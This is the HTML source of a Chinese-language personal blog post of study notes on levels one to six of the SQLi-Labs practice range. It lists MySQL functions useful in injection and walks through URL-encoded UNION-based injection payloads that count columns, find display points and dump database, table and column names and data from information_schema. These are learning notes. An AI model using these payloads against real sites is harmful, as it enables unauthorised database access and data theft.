@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>sqlilab1 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="关于SQL注入在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段达到欺骗服务器的目的，因此网站都会对用户输入的数据进行过滤来进行保护。 而在练习靶场中，我们就需要通过SQL注入的方式获得数据库中的数据，下面我就总结一下在一到六关我所用到的知识。 1.首先先了解一下数据库常用函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlilab1">
+<meta property="og:url" content="http://example.com/2022/12/01/sqlilab1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="关于SQL注入在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段达到欺骗服务器的目的，因此网站都会对用户输入的数据进行过滤来进行保护。 而在练习靶场中，我们就需要通过SQL注入的方式获得数据库中的数据，下面我就总结一下在一到六关我所用到的知识。 1.首先先了解一下数据库常用函数">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-11-30T16:58:44.000Z">
+<meta property="article:modified_time" content="2022-12-01T00:05:51.556Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-sqlilab1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/12/01/sqlilab1/" class="article-date">
+  <time class="dt-published" datetime="2022-11-30T16:58:44.000Z" itemprop="datePublished">2022-12-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      sqlilab1
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>关于SQL注入<br>在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段达到欺骗服务器的目的，因此网站都会对用户输入的数据进行过滤来进行保护。</p>
+<p>而在练习靶场中，我们就需要通过SQL注入的方式获得数据库中的数据，下面我就总结一下在一到六关我所用到的知识。</p>
+<p>1.首先先了解一下数据库常用函数与参数。<br>&#x3D;、&gt;、&gt;&#x3D;、&lt;&#x3D; 、&lt;&gt;</p>
+<p>比较运算符</p>
+<p>and、or</p>
+<p>逻辑运算符</p>
+<p>version( )</p>
+<p>mysql数据库版本</p>
+<p>database( )</p>
+<p>当前数据库名</p>
+<p>sleep( )</p>
+<p>睡眠时间为指定的秒数</p>
+<p>if(true,t,f)</p>
+<p>if判断</p>
+<p>length( )</p>
+<p>返回字符串的长度</p>
+<p>substring( )</p>
+<p>截取字符串</p>
+<p>三个函数作用相同</p>
+<p>有三个参数 mid(“1”,2,3)</p>
+<p>1.截取的字符串</p>
+<p>2.截取起始位置，从1开始计数</p>
+<p>3.截取长度</p>
+<p>substr( )</p>
+<p>mid( )</p>
+<p>left( )</p>
+<p>从左侧开始取指定字符个数的字符串</p>
+<p>concat( )</p>
+<p>没有分隔符的连接字符串</p>
+<p>concat_ws ( )</p>
+<p>含有分割符的连接字符串</p>
+<p>group_conat( )</p>
+<p>连接一个组的字符串</p>
+<p>ord( )</p>
+<p>返回ASCII码</p>
+<p>ascii( )</p>
+<p>hex( )</p>
+<p>将字符串转换为十六进制</p>
+<p>unhex( )</p>
+<p>hex的反向操作</p>
+<p>md5( )</p>
+<p>返回MD5值</p>
+<p>floor(x)</p>
+<p>返回不大于x的最大整数</p>
+<p>round ( )</p>
+<p>返回参数x接近的整数</p>
+<p>rand( )</p>
+<p>返回0-1之间的随机浮点数</p>
+<p>load_file( )</p>
+<p>读取文件，并返回文件内容作为一个字符串</p>
+<p>find_in_set( )</p>
+<p>返回字符串在字符串列表中的位置</p>
+<p>benchmark( )</p>
+<p>指定语句执行的次数</p>
+<p>name_const ( )</p>
+<p>返回表作为结果</p>
+<p>user( )</p>
+<p>用户名</p>
+<p>current_user( )</p>
+<p>当前用户名</p>
+<p>system_ user( )</p>
+<p>系统用户名</p>
+<p>@@datadir</p>
+<p>数据库路径</p>
+<p>@@versoin_compile_os</p>
+<p>操作系统版本</p>
+<p>mysql5.0版本之后，会在数据库中存放一个information_schema的数据库，在该库，我们需要记住三个表名，分别是schemata，tables，colums</p>
+<p>在schemata表中存储该用户创建的所有数据库的库名，在该表中 记录数据库库名的字段名为：schema_name</p>
+<p>tables中存储该用户创建的所有数据的库名和表名，在这个表中记录数据库库名和表名的字段名分别为 table_schema和table_name</p>
+<p>columns表存储该用户创建的所有数据库的库名，表名和字段名，在该表中记录数据库库名，表名和字段名的字段名为table_schema,table_name,column_name;<br>2.我们可以通过这样判断存在注入。<br>若在GET请求中?id&#x3D;1 and 1&#x3D;1和?id&#x3D;1 and 1&#x3D;2都没有报错，则是字符型注入。<br>若在GET请求中?id&#x3D;1 and 1&#x3D;1没有报错，但是?id&#x3D;1 and 1&#x3D;2有异常或没回显，则是数字型注入。<br>因为若注入 ?id&#x3D;1 and 1&#x3D;2 ，则数据库中查询语句为： select * from user where id&#x3D;’1 and 1&#x3D;2’;因为id为int类型，所以传入的 ‘1 and 1&#x3D;2’ 会强制转换成 ‘1’ ，&#x3D;&gt;最终数据库中的查询语句为：select * from user where id&#x3D;’1’;所以sql语句不会报错。</p>
+<p>若是数字型注入，注入 ?id&#x3D;1 and 1&#x3D;2 时的SQL语句为：select * from users where id&#x3D;1 and 1&#x3D;2 因为 select * from users where id&#x3D;1 是正确的语句 ，and 后面的 1&#x3D;2 是错误的语句，所以select * from users where id&#x3D;1 and 1&#x3D;2 会有异常或着网页没有回显（当一个错误的语句和一个正确的语句用and连接符连接时，整体就会是错误的 ）。</p>
+<p>3.联合注入<br>判断有几列（能正常显示到几就是有几行）：</p>
+<p>1<br>sqli&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1’ order by n–+(此处n为列数）<br>使用union,id&#x3D;错误值<br>3、判断回显点（联合查询时代替可以显示的数字）：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,3--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,3--+</a><br>4、获得全部数据库名称：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata--+</a><br>5、获得当前数据库名字：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,database()--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,database()--+</a><br>6、获得数据库内所有表的名称：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%27--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27数据库名%27--+</a><br>7、获得数据表中每列的名称：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27%E8%A1%A8%E5%90%8D%27--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27表名%27--+</a><br>8、我们就可以获得我们想要的信息了：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(%E5%88%97%E5%90%8D)%20from%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(列名)%20from%20数据库名.数据表名--+</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/12/01/sqlilab1/" data-id="clb4bgqtg0002hott2my3fqt3" data-title="sqlilab1" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/11/25/mysql/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">mysql</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/12/01/sqlilab1/">sqlilab1</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/25/mysql/">mysql</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/24/today/">today</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/20/%E4%BB%8E%E4%BB%8A%E5%A4%A9%E8%B5%B7%E5%9D%9A%E6%8C%81%E5%8F%91%E5%8D%9A%E5%AE%A2/">打卡博客，记录web成长</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/25/%E2%80%9C%E7%AC%AC%E4%BA%8C%E7%AF%87%E2%80%9D/">“第二篇”</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
